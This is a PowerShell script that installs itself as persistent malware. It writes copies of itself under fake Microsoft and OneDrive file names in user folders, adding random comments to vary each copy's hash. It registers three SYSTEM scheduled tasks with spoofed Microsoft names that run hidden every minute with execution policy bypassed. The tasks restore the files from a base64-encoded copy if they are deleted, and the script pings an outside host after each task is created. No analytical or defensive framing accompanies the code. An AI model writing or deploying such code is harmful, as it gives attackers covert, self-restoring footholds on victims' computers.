function Gen-Info {
    # CREATION
    # Current user
    $username = "$((Get-CimInstance Win32_ComputerSystem).UserName)"
    $username = "$($username.Split('\')[1])"

    # Paths
    $alfa_path = "C:\Users\$username\AppData\Local\Microsoft\Windows\DefenderCloudSync.ps1"
    $bravo_path = "C:\Users\$username\AppData\Roaming\Microsoft\OneDrive\OneDriveHelper.ps1"
    $charlie_path = "C:\Users\$username\AppData\Local\Temp\MicrosoftTelemetrySync.ps1"
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    $funcBody = (Get-Command Gen-Info).ScriptBlock.ToString()
    if (-not (Test-Path "$alfa_path")) {
        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$alfa_path" -Encoding UTF8
    }
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    if (-not (Test-Path "$bravo_path")) {
        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$bravo_path" -Encoding UTF8
    }
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    if (-not (Test-Path "$charlie_path")) {
        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$charlie_path" -Encoding UTF8
    }
    
    
    # SCHEDULE TASK CREATION
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    $scriptContent = "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars"
    $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($scriptContent))

    $cmd = "if (-not (Test-Path '$alfa_path') -and -not (Test-Path '$bravo_path') -and -not (Test-Path '$charlie_path')) { [IO.File]::WriteAllText('$alfa_path', [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$encoded'))) } else { if (Test-Path '$alfa_path') { powershell.exe -nop -ExecutionPolicy Bypass -WindowStyle Hidden $alfa_path } else { if (Test-Path '$bravo_path') { powershell.exe -nop -ExecutionPolicy Bypass -WindowStyle Hidden $bravo_path } else { if (Test-Path '$charlie_path') { & '$charlie_path' } } } }"
    
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$cmd`""
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -ExecutionTimeLimit (New-TimeSpan)
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
    
    $task_alfa = "MicrosoftDefenderCloudSync"
    try{
        if (-not (Get-ScheduledTask -TaskName $task_alfa -ErrorAction SilentlyContinue)) {
            Register-ScheduledTask -TaskName $task_alfa -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
            
            # CONNECTION
            Test-Connection -ComputerName Secnesys.com -Count 1
        }
    } catch {}
    
    $task_bravo = "OneDriveSyncHelper"
    try{
        if (-not (Get-ScheduledTask -TaskName $task_bravo -ErrorAction SilentlyContinue)) {
            Register-ScheduledTask -TaskName $task_bravo -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force

            # CONNECTION
            Test-Connection -ComputerName Secnesys.com -Count 1
        }
    } catch {} 
    
    
    $task_charlie = "MicrosoftTelemetrySync"
    try{
        if (-not (Get-ScheduledTask -TaskName $task_charlie -ErrorAction SilentlyContinue)) {
            Register-ScheduledTask -TaskName $task_charlie -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force

            # CONNECTION
            Test-Connection -ComputerName Secnesys.com -Count 1
        }
    } catch {} 
    
}

Gen-Info
